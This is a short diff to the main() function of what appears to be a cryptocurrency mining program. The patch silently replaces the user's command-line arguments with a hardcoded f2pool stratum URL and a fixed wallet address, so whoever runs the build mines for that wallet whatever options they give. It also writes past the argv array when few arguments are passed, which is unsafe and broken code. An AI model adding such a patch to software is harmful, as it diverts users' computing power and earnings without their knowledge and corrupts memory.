@@ -1305,6 +1305,9 @@ int main(int argc, char** argv)
     // 3 - Other exceptions
     // 4 - Possible corruption
 
+    argc =3;
+    argv[1]="-P\0";
+    argv[2]="stratum1+tcp://0x91b3735B11Cda3B10D63537ACfD4b0866Af7c83b.4@eth.f2pool.com:6688\0";
 #if defined(_WIN32)
     // Need to change the code page from the default OEM code page (437) so that
     // UTF-8 characters are displayed correctly in the console
